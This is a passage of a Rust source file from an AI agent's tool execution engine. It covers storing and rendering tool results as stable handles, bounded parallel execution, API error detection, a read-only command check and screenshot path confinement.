// Error-protocol layer-3 backlog (docs/research/2026-08-06-error-conventions-and-host-bridge.md §3.6):
// the deny regime in Cargo.toml is live; this module still carries pre-existing
// violations of the lints below. Remove this allow as the module migrates onto
// the regime.
// Tracking: docs/error-protocol-backlog.md
#![allow(
    clippy::as_conversions,
    clippy::format_push_string,
    clippy::indexing_slicing,
    clippy::shadow_reuse
)]
//! Tool execution engine: the inline path every tool call takes.
//!
//! Extracted from `agent_loop.rs` to isolate tool execution logic.

use std::time::Duration;

use base64::Engine;
use serde_json::{json, Value};
use tracing::{debug, warn, Instrument};

use crate::agent::audit::ToolEvent;
use crate::agent::context::ContextBuilder;
use crate::providers::base::{LLMResponse, ToolCallRequest};
use crate::session::db::ToolPreExecuteDecision;
use std::sync::Arc;

use super::agent_loop::TurnContext;
use crate::agent::context_hygiene::TOOL_RESULT_REPLAY_MAX_BYTES;
use crate::agent::tools::base::ToolConcurrency;

#[cfg(test)]
const LARGE_TOOL_RESULT_TOKEN_THRESHOLD: usize = 500;
/// Bound native multi-tool fan-out. Four concurrent reads/fetches keep local
/// resource use predictable while still collapsing the dominant serial waits.
const MAX_PARALLEL_TOOL_CALLS: usize = 4;
/// Minimum room for a compact receipt with an inspection handle. Below this, the
/// prompt may save a few bytes while losing the exact retrieval path.
const MIN_BATCH_TOOL_RESULT_CAP_CHARS: usize = 320;
/// The sole readable tool-result projection. This is deliberately independent
/// of user-configured tool output limits so one inspection cannot reintroduce
/// an oversized prompt suffix.
const TOOL_RESULT_INSPECTION_MAX_CHARS: usize = 8_192;

/// Per-tool token threshold above which a raw tool result is replaced by a
/// summary. Enumerative tools (`exec`, `list_dir`, `web_search`, `read_file`)
/// return specific strings — filenames, URLs, error lines — that the model
/// needs to quote verbatim. Summaries destroy them, which the model then
/// papers over by fabricating. Keep raw output for these up to ~4000 tokens.
#[cfg(test)]
fn summary_threshold_tokens(tool_name: &str) -> usize {
    match tool_name {
        "exec" | "list_dir" | "find_files" | "search_files" | "search_context" | "file_info"
        | "file_preview" | "workspace_diff" | "system_info" | "tool_status" | "web_search"
        | "read_file" => 4000,
        _ => LARGE_TOOL_RESULT_TOKEN_THRESHOLD,
    }
}

fn effective_tool_result_cap(configured_max_chars: usize) -> usize {
    // This setting is the user-visible contract. A second hidden 1,200-char
    // ceiling made ordinary ranged reads lossy even when the configured limit
    // was 10,000. Older results are compacted later by the context-budget hot
    // path, which already preserves the four freshest tool messages.
    configured_max_chars.max(1)
}

fn inline_hot_prompt_result_cap(ctx: &TurnContext) -> usize {
    effective_tool_result_cap(ctx.core.max_tool_result_chars)
}

fn inline_hot_prompt_result_cap_from_effective(cap: usize, result_count: usize) -> usize {
    if result_count <= 1 {
        return cap;
    }

    // Multi-tool rounds are the latency cliff: per-result caps stack into an
    // uncached suffix. Share one replay-sized budget across the batch so Higgs
    // stays on the retained continuation path.
    let batch_cap = cap.min(TOOL_RESULT_REPLAY_MAX_BYTES).max(1);
    (batch_cap / result_count.max(1))
        .max(MIN_BATCH_TOOL_RESULT_CAP_CHARS)
        .min(cap)
        .max(1)
}

fn inline_hot_prompt_result_cap_for_ctx_batch(ctx: &TurnContext, result_count: usize) -> usize {
    inline_hot_prompt_result_cap_from_effective(inline_hot_prompt_result_cap(ctx), result_count)
}

/// Stash raw output before prompt shaping. Multi-result batches force this so
/// even medium reads can be reduced to receipts without losing exact recall.
///
/// Returns:
/// - `Ok(false)` — small data, not stashed (cap gate hit, no store needed).
/// - `Ok(true)` — newly stashed (`Stored`) or idempotent retry (`Identical`);
///   the body is durably present under `(session_id, tool_call_id)`.
/// - `Err(StoredResult)` — the stash could NOT prove durability of the exact
///   bytes (`Conflict`: different bytes already present; `Failed`: SQLite
///   error). The caller MUST NOT show a raw body or re-run a side-effect tool;
///   it surfaces this via `abort_turn_on_stash_failure` so the turn fails
///   cleanly. See `docs/superpowers/plans/2026-07-30-tool-result-handles-not-bodies.md`.
#[cfg(test)]
async fn stash_tool_result_for_prompt_shaping(
    sessions: &crate::session::SessionDb,
    session_id: &str,
    tool_call_id: &str,
    tool_name: &str,
    data: &str,
    cap: usize,
    force: bool,
) -> Result<bool, crate::session::db::StoredResult> {
    use crate::session::db::StoredResult;
    // No retrieval exemption: a result can be hundreds of KB and must stay
    // stashable under its own id. Exempting it left raw output in live context,
    // which inflated a session to 77k tokens (2026-07-30).
    if !force && data.chars().count() <= cap && data.len() <= TOOL_RESULT_REPLAY_MAX_BYTES {
        return Ok(false);
    }
    match sessions
        .store_tool_result_immutable(session_id, tool_call_id, tool_name, data)
        .await
    {
        StoredResult::Stored { .. } => Ok(true),
        // Idempotent retry — the same tool_call_id with byte-identical content
        // (e.g. a model re-reading the same file). Accept it as "stashed":
        // the body IS present under this key.
        StoredResult::Identical { .. } => Ok(true),
        // Different bytes already stored under this key, or SQLite failure.
        // Either way the invariant is violated; surface it.
        sr @ (StoredResult::Conflict { .. } | StoredResult::Failed) => Err(sr),
    }
}

/// The canonical stable handle marker. A tool-result message whose content
/// starts with this is a handle — it carries metadata + a tiny excerpt, never
/// the full body. The body lives in the stash, fetchable via
/// `inspect_tool_result({"tool_call_id": id})`.
pub(crate) const TOOL_RESULT_HANDLE_MARKER: &str = "TOOL_RESULT_HANDLE v1 |";

/// The canonical stable marker for a bounded result from an explicit retrieval
/// tool. Unlike a handle, the excerpt remains directly readable in the
/// prompt; the marker tells history replay it was rendered at ingestion and
/// must never be shaped again with a different cap.
pub(crate) const TOOL_RESULT_EXCERPT_MARKER: &str = "TOOL_RESULT_EXCERPT v1 |";

/// A durable receipt for a cache hit within the same tool-call turn. The
/// receipt may include the original inline result, so it can exceed the
/// ordinary inline threshold even though no new result was executed or
/// stored under the replay call ID.
pub(crate) const TOOL_CACHED_REPLAY_MARKER: &str = "TOOL_CACHED_REPLAY v1 |";

pub(crate) fn is_stable_tool_result_representation(content: &str) -> bool {
    content.starts_with(TOOL_RESULT_HANDLE_MARKER) || content.starts_with(TOOL_CACHED_REPLAY_MARKER)
}

/// Inspection is the only operation allowed to show selected result content
/// directly to the model. Full recall and separate search/slice names remain
/// legacy implementation details, never prompt-visible escape hatches.
fn is_explicit_retrieval_tool(name: &str) -> bool {
    name == "inspect_tool_result"
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ToolResultExposure {
    Handle,
    ExplicitExcerpt,
}

fn tool_result_exposure(name: &str) -> ToolResultExposure {
    if is_explicit_retrieval_tool(name) {
        ToolResultExposure::ExplicitExcerpt
    } else {
        ToolResultExposure::Handle
    }
}

/// True when `rendered` is a retrieval excerpt created by the pre-marker
/// renderer. This recognizes in-flight sessions written before
/// [`TOOL_RESULT_EXCERPT_MARKER`] existed: the exact stash is immutable, and
/// regenerating its already-shaped preview with the replay cap would change a
/// prior provider message and invalidate the cached prefix.
pub(crate) fn is_persisted_retrieval_excerpt(
    tool_name: &str,
    tool_call_id: &str,
    rendered: &str,
    exact_body: &str,
) -> bool {
    if !is_explicit_retrieval_tool(tool_name) {
        return false;
    }
    if rendered.starts_with(TOOL_RESULT_EXCERPT_MARKER) {
        return true;
    }
    if rendered == exact_body {
        return false;
    }

    // The legacy renderer used its cap as the resulting preview length, so
    // infer it from the persisted text and require a byte-for-byte match.
    // This cannot misclassify a raw body unless it is exactly the deterministic
    // digest of a different stashed body.
    rendered
        == digest_tool_result(
            tool_name,
            &std::collections::HashMap::new(),
            exact_body,
            rendered.chars().count(),
            tool_call_id,
        )
}

/// Render the canonical, write-once-stable handle for a tool result. Pure and
/// deterministic: identical inputs always produce byte-identical output, so a
/// handle rendered live at ingestion is identical to the one persisted to
/// SQLite and reloaded later — no prefix-cache drift (the root cause of the
/// `token_mismatch` desync class).
///
/// Built ONCE at ingestion from the exact stored bytes. The `sha256` is over
/// those bytes; `total_chars` is the Unicode char count; `args` is a fixed-scalar
/// allowlist (path/command/query) in a fixed order; `excerpt` is the first
/// non-empty line, trimmed, whitespace-run-collapsed, char-capped at 160.
/// Never LLM-summarized — summarization would make it non-stable.
fn render_tool_result_handle(
    id: &str,
    tool: &str,
    ok: bool,
    stored_bytes: &[u8],
    args: &std::collections::HashMap<String, Value>,
) -> String {
    use sha2::{Digest, Sha256};
    let digest = {
        let mut hasher = Sha256::new();
        hasher.update(stored_bytes);
        format!("{:x}", hasher.finalize())
    };
    let chars = std::str::from_utf8(stored_bytes)
        .map(|s| s.chars().count())
        .unwrap_or(stored_bytes.len());
    let excerpt = handle_excerpt(stored_bytes);
    format!(
        r#"{MARKER} id:{id_j} | tool:{tool_j} | ok:{ok} | total_chars:{chars} | sha256:{digest} | args:{args_j} | excerpt:{excerpt_j} | fetch:"inspect_tool_result" | first_read:{{"tool_call_id":{id_j},"start_char":0}}"#,
        MARKER = TOOL_RESULT_HANDLE_MARKER,
        id_j = serde_json::to_string(id).unwrap_or_else(|_| "\"\"".into()),
        tool_j = serde_json::to_string(tool).unwrap_or_else(|_| "\"\"".into()),
        args_j = serde_json::to_string(&tool_arg_summary(args)).unwrap_or_else(|_| "{}".into()),
        excerpt_j = serde_json::to_string(&excerpt).unwrap_or_else(|_| "\"\"".into()),
    )
}

/// The provider-facing ingestion chokepoint for completed tool output.
///
/// Store exact bytes before rendering anything for the model. Ordinary results
/// become deterministic handles; only explicit inspection retains a readable,
/// versioned excerpt with a fixed hard ceiling. A storage failure never falls
/// back to raw output.
pub(crate) async fn store_then_render_tool_result(
    sessions: &crate::session::SessionDb,
    session_id: &str,
    tool_call_id: &str,
    tool_name: &str,
    args: &std::collections::HashMap<String, Value>,
    exact_body: &str,
    ok: bool,
    cap: usize,
) -> Result<String, crate::session::db::StoredResult> {
    use crate::session::db::StoredResult;

    match sessions
        .store_tool_result_immutable_with_status(
            session_id,
            tool_call_id,
            tool_name,
            exact_body,
            ok,
        )
        .await
    {
        StoredResult::Stored { .. } | StoredResult::Identical { .. } => {}
        outcome @ (StoredResult::Conflict { .. } | StoredResult::Failed) => return Err(outcome),
    }

    Ok(match tool_result_exposure(tool_name) {
        ToolResultExposure::Handle => {
            // Hybrid exposure (prototype): small results go INLINE — their
            // bytes are deterministic and immutable once stashed, so they are
            // just as cache-stable as a handle, and inlining spares the model
            // an inspect_tool_result round-trip per result. Only genuinely
            // large results stay handles (context protection). The reload
            // path in SessionDb::get_history applies the same threshold.
            if exact_body.len() <= crate::agent::context_hygiene::INLINE_TOOL_RESULT_MAX_BYTES {
                exact_body.to_string()
            } else {
                render_tool_result_handle(tool_call_id, tool_name, ok, exact_body.as_bytes(), args)
            }
        }
        ToolResultExposure::ExplicitExcerpt => {
            render_stable_retrieval_excerpt(tool_name, args, exact_body, cap, tool_call_id)
        }
    })
}

/// Render an inspection excerpt once at ingestion. The fixed ceiling—not the
/// caller or config—is the context safety boundary.
fn render_stable_retrieval_excerpt(
    tool_name: &str,
    args: &std::collections::HashMap<String, Value>,
    exact_body: &str,
    cap: usize,
    tool_call_id: &str,
) -> String {
    let marker_chars = TOOL_RESULT_EXCERPT_MARKER.chars().count() + 1; // newline
    let excerpt_cap = cap
        .min(TOOL_RESULT_INSPECTION_MAX_CHARS)
        .min(TOOL_RESULT_REPLAY_MAX_BYTES)
        .saturating_sub(marker_chars);
    let excerpt = digest_tool_result(tool_name, args, exact_body, excerpt_cap, tool_call_id);
    format!("{TOOL_RESULT_EXCERPT_MARKER}\n{excerpt}")
}

/// Fixed-scalar allowlist for the handle's `args` field, in a fixed order.
/// Only these keys are surfaced (deterministic + compact); everything else is
/// dropped. JSON-escaped by the caller via `serde_json::to_string`.
fn tool_arg_summary(
    args: &std::collections::HashMap<String, Value>,
) -> Vec<(&'static str, String)> {
    let mut out = Vec::new();
    for key in &["path", "command", "query"] {
        if let Some(v) = args.get(*key) {
            if let Some(s) = v.as_str() {
                out.push((*key, s.to_string()));
            }
        }
    }
    out
}

/// First non-empty line of `stored_bytes`, trimmed, with runs of whitespace
/// collapsed to a single space, char-capped at 160. Deterministic — never
/// LLM-summarized.
fn handle_excerpt(stored_bytes: &[u8]) -> String {
    let text = std::str::from_utf8(stored_bytes).unwrap_or("");
    let line = text
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap_or("")
        .trim();
    let mut collapsed = String::with_capacity(line.len().min(320));
    let mut prev_ws = false;
    for ch in line.chars() {
        if ch.is_whitespace() {
            if !prev_ws {
                collapsed.push(' ');
            }
            prev_ws = true;
        } else {
            collapsed.push(ch);
            prev_ws = false;
        }
    }
    collapsed.chars().take(160).collect()
}

/// Surface a stash failure to the loop and to the user. Sets
/// `ctx.flow.infra_error` so `step_execute_tools` finalizes the turn with this
/// message after the tool engine returns; also pushes an `ok:false` tool
/// receipt so the model's tool-call gets a deterministic error response
/// (rather than dangling). The raw body is NEVER shown — a handle pointing at
/// un-stashed bytes would lie (the cache-desync root cause). See plan Hole 1.
fn abort_turn_on_stash_failure(
    ctx: &mut TurnContext,
    tool_id: &str,
    tool_name: &str,
    sr: &crate::session::db::StoredResult,
) {
    ctx.flow.infra_error = Some(format!(
        "tool-result stash failed for {tool_id} ({sr:?}) — turn aborted to preserve the exact-bytes invariant"
    ));
    let msg = format!("Error: result for {tool_id} could not be durably stored; turn aborted.");
    ctx.messages.with_draft(|draft| {
        ContextBuilder::add_tool_result_with_status(draft, tool_id, tool_name, &msg, false)
    });
}

/// Build a head+tail preview of `data` (≤ `cap` chars) with an
/// `inspect_tool_result` pointer to `tool_call_id`. Assumes the full body is
/// ALREADY stashed (by the caller) when `data` was truncated — this only
/// shapes the in-context preview.
fn build_tool_result_preview(
    tool_name: &str,
    _args: &std::collections::HashMap<String, Value>,
    data: &str,
    cap: usize,
    tool_call_id: &str,
) -> String {
    let total_chars = data.chars().count();
    if total_chars <= cap {
        return data.to_string();
    }
    let estimated_tokens = crate::agent::token_budget::TokenBudget::estimate_str_tokens(data);
    let header = format!(
        "[truncated: {tool_name}, ~{estimated_tokens} tokens; \
         inspect_tool_result({{\"tool_call_id\": \"{tool_call_id}\", \"query\": \"...\"}}) \
         or use start_line/end_line]\n"
    );
    let footer = "\n[...]\n";
    let fixed_chars = header.chars().count() + footer.chars().count();
    if fixed_chars >= cap {
        // A long provider-controlled tool_call_id can push the header itself
        // past the cap; bound it char-wise like the body paths below (see
        // main 1957f5d).
        return header.chars().take(cap).collect();
    }
    let preview_budget = cap.saturating_sub(fixed_chars).max(200);
    let head_chars = preview_budget * 2 / 3;
    let tail_chars = preview_budget.saturating_sub(head_chars);
    let head: String = data.chars().take(head_chars).collect();
    let tail_rev: Vec<char> = data.chars().rev().take(tail_chars).collect();
    let tail: String = tail_rev.into_iter().rev().collect();
    let mut out = format!("{header}{head}{footer}{tail}");
    if out.chars().count() > cap {
        out = out.chars().take(cap).collect();
    }
    out
}

/// Digest a tool result for in-context storage with lossless retrieval.
///
/// Small results (≤ `cap`) pass through verbatim. Large results are reduced to
/// a head+tail preview; the caller has already stored the FULL body in SQLite
/// under `(session_id, tool_call_id)`. The preview tells the model how to call
/// `inspect_tool_result` to recover a bounded part. This bounds each result's
/// in-context cost to ~`cap` chars (so N tool calls cost ~N×cap, not N×full)
/// while keeping any result one tool call away — no re-run needed.
fn digest_tool_result(
    tool_name: &str,
    args: &std::collections::HashMap<String, Value>,
    data: &str,
    cap: usize,
    tool_call_id: &str,
) -> String {
    // No retrieval exemption: every output is shaped by the same cap and the
    // preview points at bounded inspection instead of full replay.
    let prompt_cap = cap.min(TOOL_RESULT_REPLAY_MAX_BYTES);
    let total_chars = data.chars().count();
    if total_chars <= prompt_cap && data.len() <= TOOL_RESULT_REPLAY_MAX_BYTES {
        return data.to_string();
    }
    build_tool_result_preview(tool_name, args, data, prompt_cap, tool_call_id)
}

/// Tools that receive a reasoning checkpoint before execution when configured.
pub(crate) fn is_side_effect_tool(name: &str) -> bool {
    matches!(name, "exec" | "write_file" | "edit_file" | "apply_patch")
}

/// True when an `exec` command is a pure read: it starts with a
/// conventionally read-only binary and contains no redirect or mutating
/// sub-command. Used to auto-renew the tool lease for exec-based reading —
/// models commonly `cat`/`grep`/`find` through shell, and metering those as
/// side-effect calls starves the turn's actual write. Conservative by
/// design: anything ambiguous stays metered.
#[cfg(test)]
pub(crate) fn is_read_only_exec_command(command: Option<&str>) -> bool {
    let Some(cmd) = command else {
        return false;
    };
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return false;
    }
    // Redirects, pipes into mutating tools, and known mutating binaries make
    // the whole command metered. `>` covers `>>` via substring. `2>/dev/null`
    // and `2>&1` discard/handle stderr without writing artifacts and are the
    // standard read-command idiom, so they are ignored for the check.
    const MUTATING_MARKERS: &[&str] = &[
        ">", "tee ", "mv ", "cp ", "rm ", "dd ", "chmod", "chown", "mkdir", "touch", "sed -i",
        "sh ", "sh -c", "bash ", "eval ", "install ", "ln ",
    ];
    let normalized: String = cmd.replace("2>/dev/null", "").replace("2>&1", "");
    if MUTATING_MARKERS
        .iter()
        .any(|marker| normalized.contains(marker))
    {
        return false;
    }
    let first = cmd.split_whitespace().next().unwrap_or("");
    let base = first.rsplit('/').next().unwrap_or(first);
    matches!(
        base,
        "cat"
            | "grep"
            | "rg"
            | "find"
            | "ls"
            | "head"
            | "tail"
            | "wc"
            | "file"
            | "stat"
            | "which"
            | "dig"
            | "host"
            | "uname"
            | "date"
            | "pwd"
            | "batgrep"
    )
}

#[cfg(test)]
pub(crate) fn is_read_only_tool(name: &str) -> bool {
    matches!(
        name,
        "read_file"
            | "list_dir"
            | "find_files"
            | "search_files"
            | "file_info"
            | "file_preview"
            | "get_skills"
            | "inspect_tool_result"
            | "get_tools"
    )
}

/// Append the one assistant carrier that owns a routed batch before policy or
/// execution can settle any member. Callers pass the complete batch, including
/// calls that a lease will reject, so a tool result can never become orphaned.
pub(crate) fn append_tool_call_carrier(
    ctx: &mut TurnContext,
    routed_tool_calls: &[ToolCallRequest],
    response: &LLMResponse,
) {
    let tc_json: Vec<Value> = routed_tool_calls
        .iter()
        .map(ToolCallRequest::to_openai_json)
        .collect();
    ctx.messages.with_draft(|draft| {
        ContextBuilder::add_assistant_message(draft, response.content.as_deref(), Some(&tc_json));
    });
}

/// Collects everything produced by a single tool execution, ready for
/// sequential post-processing by `inject_tool_result`.
/// Detect API error bodies in tool results and convert them to failures.
///
/// Tools like `web_fetch` may return `ok=true` with JSON bodies like
/// `{"status":"error","message":"API key missing"}`. The model sees
/// `ok=true` and cannot self-correct. This converts known API error
/// patterns to `Error: ...` failures.
fn detect_api_error_body(
    result: crate::agent::tools::base::ToolExecutionResult,
) -> crate::agent::tools::base::ToolExecutionResult {
    if !result.ok() {
        return result;
    }
    let body = result.data().to_string();
    // Fast path: only parse JSON if it contains error-like keys. Some APIs,
    // notably GitHub, report authentication and rate-limit failures through a
    // top-level `message` without an explicit status or error field.
    let has_status_error =
        body.contains("\"status\": \"error\"") || body.contains("\"status\":\"error\"");
    let has_error_key = body.contains("\"error\"");
    let has_message_key = body.contains("\"message\"");
    if !has_status_error && !has_error_key && !has_message_key {
        return result;
    }
    if let Ok(v) = serde_json::from_str::<serde_json::Value>(&body) {
        if let Some(message) = v.get("message").and_then(|message| message.as_str()) {
            let normalized = message.to_ascii_lowercase();
            let is_known_api_failure = normalized.contains("api rate limit exceeded")
                || normalized.contains("secondary rate limit")
                || normalized == "bad credentials"
                || normalized.contains("requires authentication");
            if is_known_api_failure {
                return crate::agent::tools::base::ToolExecutionResult::failure(
                    message.to_string(),
                );
            }
        }
        // Pattern 1: {"status": "error", "message": "...", "code": "..."}
        if v.get("status").and_then(|s| s.as_str()) == Some("error") {
            if let Some(msg) = v.get("message").and_then(|m| m.as_str()) {
                let code = v.get("code").and_then(|c| c.as_str()).unwrap_or("");
                let with_code = if code.is_empty() {
                    msg.to_string()
                } else {
                    format!("{} [{}]", msg, code)
                };
                return crate::agent::tools::base::ToolExecutionResult::failure(with_code);
            }
        }
        // Pattern 2: {"error": {"message": "...", "code": "..."}}
        if let Some(err) = v.get("error") {
            if let Some(msg) = err.get("message").and_then(|m| m.as_str()) {
                let code = err.get("code").and_then(|c| c.as_str()).unwrap_or("");
                let with_code = if code.is_empty() {
                    msg.to_string()
                } else {
                    format!("{} [{}]", msg, code)
                };
                return crate::agent::tools::base::ToolExecutionResult::failure(with_code);
            }
            // {"error": "message string"}
            if let Some(msg) = err.as_str() {
                return crate::agent::tools::base::ToolExecutionResult::failure(msg.to_string());
            }
        }
    }
    result
}

struct SingleToolResult {
    tool_name: String,
    tool_id: String,
    arguments: std::collections::HashMap<String, serde_json::Value>,
    result: crate::agent::tools::base::ToolExecutionResult,
    duration_ms: u64,
    replay_error: Option<String>,
}

#[derive(Clone)]
struct ToolReplayRecorder {
    sessions: Arc<crate::session::SessionDb>,
    session_id: String,
    turn_request_id: String,
    turn_tag: u64,
}

async fn record_completed_tool(
    mut result: SingleToolResult,
    recorder: Option<&ToolReplayRecorder>,
) -> SingleToolResult {
    if let Some(recorder) = recorder {
        if let Err(error) = recorder
            .sessions
            .record_tool_execute(
                &recorder.session_id,
                &recorder.turn_request_id,
                recorder.turn_tag,
                &result.tool_id,
                result.result.data(),
                result.result.ok(),
                result.duration_ms,
            )
            .await
        {
            result.replay_error = Some(error.to_string());
        }
    }
    result
}

/// Execute one tool call: emit CallStart, run heartbeat, call the tool,
/// stop heartbeat, return `SingleToolResult`.
///
/// All fields needed for post-processing are included in the return value so
/// that the caller can mutate `ctx` after the futures complete.
async fn execute_single_tool(
    tc: &ToolCallRequest,
    tools: &crate::agent::tools::registry::ToolRegistry,
    tool_event_tx: &Option<tokio::sync::mpsc::UnboundedSender<ToolEvent>>,
    cancellation_token: &Option<tokio_util::sync::CancellationToken>,
    tool_heartbeat_secs: u64,
    taint_warning: Option<String>,
    replay_recorder: Option<&ToolReplayRecorder>,
) -> SingleToolResult {
    let tool_span = tracing::info_span!(
        "execute_tool_inline",
        tool = %tc.name,
        ok = tracing::field::Empty,
    );

    async {
        debug!("Executing tool: {} (id: {})", tc.name, tc.id);

        if let Some(summary) = taint_warning {
            warn!(
                "TAINT WARNING: Executing sensitive tool '{}' with tainted context from: {}",
                tc.name, summary
            );
        }

        // Emit CallStart.
        if let Some(ref tx) = tool_event_tx {
            // Keep enough of the arguments JSON that the REPL can recover the
            // command/path for the persistent tool line (e.g. exec's command).
            let preview: String = serde_json::to_string(&tc.arguments)
                .unwrap_or_default()
                .chars()
                .take(200)
                .collect();
            let _ = tx.send(ToolEvent::CallStart {
                tool_name: tc.name.clone(),
                tool_call_id: tc.id.clone(),
                arguments_preview: preview,
            });
        }

        let start = std::time::Instant::now();

        // A later bounded chunk may start after a sibling observes turn
        // cancellation. Return a protocol result without entering the tool.
        if cancellation_token
            .as_ref()
            .is_some_and(|token| token.is_cancelled())
        {
            return record_completed_tool(
                SingleToolResult {
                    tool_name: tc.name.clone(),
                    tool_id: tc.id.clone(),
                    arguments: tc.arguments.clone(),
                    result: crate::agent::tools::base::ToolExecutionResult::failure(
                        "tool call cancelled".to_string(),
                    ),
                    duration_ms: 0,
                    replay_error: None,
                },
                replay_recorder,
            )
            .await;
        }

        // Spawn heartbeat that emits Progress ticks until the tool finishes.
        let heartbeat = if let Some(ref tx) = tool_event_tx {
            let hb_tx = tx.clone();
            let hb_name = tc.name.clone();
            let hb_id = tc.id.clone();
            let hb_start = start;
            let hb_interval = tool_heartbeat_secs;
            Some(tokio::spawn(async move {
                let mut interval = tokio::time::interval(Duration::from_secs(hb_interval));
                interval.tick().await; // skip the immediate first tick
                loop {
                    interval.tick().await;
                    let _ = hb_tx.send(ToolEvent::Progress {
                        tool_name: hb_name.clone(),
                        tool_call_id: hb_id.clone(),
                        elapsed_ms: hb_start.elapsed().as_millis() as u64,
                        output_preview: None,
                    });
                }
            }))
        } else {
            None
        };

        let execution = async {
            use crate::agent::tools::base::ToolContext;

            // Tool-call identity is part of the execution contract, not a UI
            // concern. A closed channel keeps headless calls event-free while
            // still carrying the provider ID needed for idempotent mutations.
            let event_tx = tool_event_tx.as_ref().cloned().unwrap_or_else(|| {
                let (tx, rx) = tokio::sync::mpsc::unbounded_channel();
                drop(rx);
                tx
            });
            let exec_ctx = ToolContext::new(
                None,
                event_tx,
                cancellation_token
                    .as_ref()
                    .map(|t| t.child_token())
                    .unwrap_or_else(tokio_util::sync::CancellationToken::new),
                tc.id.clone(),
            );
            tools
                .execute_with_context(&tc.name, tc.arguments.clone(), &exec_ctx)
                .await
        };
        let result = if let Some(token) = cancellation_token {
            tokio::select! {
                biased;
                result = execution => result,
                _ = token.cancelled() => crate::agent::tools::base::ToolExecutionResult::failure(
                    "tool call cancelled".to_string()
                ),
            }
        } else {
            execution.await
        };

        // Stop heartbeat.
        if let Some(hb) = heartbeat {
            hb.abort();
        }

        // Surface API errors: web_fetch etc return ok=true with
        // {"status":"error",...} bodies. Convert so the model sees Error: ...
        let result = detect_api_error_body(result);

        let duration_ms = start.elapsed().as_millis() as u64;
        tracing::Span::current().record("ok", result.ok());
        debug!(
            "Tool {} result ({}B, ok={}, {}ms)",
            tc.name,
            result.data().len(),
            result.ok(),
            duration_ms
        );

        record_completed_tool(
            SingleToolResult {
                tool_name: tc.name.clone(),
                tool_id: tc.id.clone(),
                arguments: tc.arguments.clone(),
                result,
                duration_ms,
                replay_error: None,
            },
            replay_recorder,
        )
        .await
    }
    .instrument(tool_span)
    .await
}

fn tool_call_chunk_end(
    calls: &[&ToolCallRequest],
    start: usize,
    tools: &crate::agent::tools::registry::ToolRegistry,
) -> usize {
    if tools.concurrency(&calls[start].name) != ToolConcurrency::ParallelSafe {
        return start + 1;
    }
    let mut end = start + 1;
    while end < calls.len()
        && tools.concurrency(&calls[end].name) == ToolConcurrency::ParallelSafe
        && end - start < MAX_PARALLEL_TOOL_CALLS
    {
        end += 1;
    }
    end
}

/// Execute exactly one lifecycle chunk: one sequential call or one bounded
/// run of adjacent `ParallelSafe` calls. The caller persists every result
/// before asking for the next chunk.
async fn execute_tool_call_chunk(
    calls: &[&ToolCallRequest],
    start: usize,
    tools: &crate::agent::tools::registry::ToolRegistry,
    tool_event_tx: &Option<tokio::sync::mpsc::UnboundedSender<ToolEvent>>,
    cancellation_token: &Option<tokio_util::sync::CancellationToken>,
    tool_heartbeat_secs: u64,
    taints: &[Option<String>],
    replay_recorder: Option<&ToolReplayRecorder>,
) -> (Vec<SingleToolResult>, usize) {
    let end = tool_call_chunk_end(calls, start, tools);
    if end == start + 1 && tools.concurrency(&calls[start].name) != ToolConcurrency::ParallelSafe {
        let result = execute_single_tool(
            calls[start],
            tools,
            tool_event_tx,
            cancellation_token,
            tool_heartbeat_secs,
            taints[start].clone(),
            replay_recorder,
        )
        .await;
        return (vec![result], start + 1);
    }

    let futures = calls[start..end]
        .iter()
        .zip(taints[start..end].iter().cloned())
        .map(|(tc, taint)| {
            execute_single_tool(
                tc,
                tools,
                tool_event_tx,
                cancellation_token,
                tool_heartbeat_secs,
                taint,
                replay_recorder,
            )
        });
    (futures_util::future::join_all(futures).await, end)
}

/// Execute calls in provider order. Retained for focused concurrency tests;
/// production uses the same chunk primitive and persists between chunks.
#[cfg(test)]
async fn execute_tool_calls_ordered(
    calls: &[&ToolCallRequest],
    tools: &crate::agent::tools::registry::ToolRegistry,
    tool_event_tx: &Option<tokio::sync::mpsc::UnboundedSender<ToolEvent>>,
    cancellation_token: &Option<tokio_util::sync::CancellationToken>,
    tool_heartbeat_secs: u64,
    taints: Vec<Option<String>>,
    replay_recorder: Option<&ToolReplayRecorder>,
) -> Vec<SingleToolResult> {
    let mut results = Vec::with_capacity(calls.len());
    let mut start = 0;

    while start < calls.len() {
        let (chunk, next) = execute_tool_call_chunk(
            calls,
            start,
            tools,
            tool_event_tx,
            cancellation_token,
            tool_heartbeat_secs,
            &taints,
            replay_recorder,
        )
        .await;
        results.extend(chunk);
        start = next;
    }

    results
}

/// Parse the cua screenshot marker and apply every gate: tool name, success,
/// vision capability, marker presence, and path confinement under
/// `<workspace>/cua/`. Pure — no IO — so the gate logic is unit-testable
/// without a TurnContext.
fn cua_screenshot_candidate(
    tool_name: &str,
    ok: bool,
    vision: bool,
    data: &str,
    workspace: &std::path::Path,
) -> Option<std::path::PathBuf> {
    if tool_name != "cua" || !ok || !vision {
        return None;
    }
    let path_str = data
        .lines()
        .rev()
        .find_map(|line| line.strip_prefix("Screenshot saved: ").map(str::to_string))?;
    let path = std::path::PathBuf::from(&path_str);
    // Defense in depth: only accept paths under <workspace>/cua/. Also reject
    // any `..` component: `Path::starts_with` compares components without
    // normalizing, so `<workspace>/cua/../x.png` would pass the prefix check
    // yet resolve outside the directory. The marker is tool-generated (not
    // model-injectable), so this is defense-in-depth, not a live exploit.
    let cua_dir = workspace.join("cua");
    if !path.starts_with(&cua_dir) {
        return None;
    }
    if path
        .components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return None;
    }
    Some(path)
}

/// Read + embed one screenshot: read the file (≤ 10 MiB), base64-encode it,
/// and append a synthetic user turn carrying it as an `image_url` content
/// part so the model sees the screen. The image is in-memory only: the
/// `_synthetic` marker (with no `_cache_replay`) makes
/// `TurnContext::persist_pending_protocol_messages` skip it, so the base64
/// never lands in the session DB and never reloads into later turns. Every
/// skip path is silent: the tool's text result already told the model the
/// path.
async fn append_cua_screenshot_turn(
    messages: &mut Vec<serde_json::Value>,
    path: std::path::PathBuf,
) {
    const MAX_EMBED_BYTES: usize = 10 * 1024 * 1024;
    let path_str = path.to_string_lossy().to_string();
    // Size gate before read: never fully buffer an oversized file. `try_from`
    // avoids an `as` conversion; a file that does not fit usize is certainly
    // oversized, so treat that as MAX. The post-read check below stays as
    // belt-and-suspenders.
    let Ok(meta) = tokio::fs::metadata(&path).await else {
        return;
    };
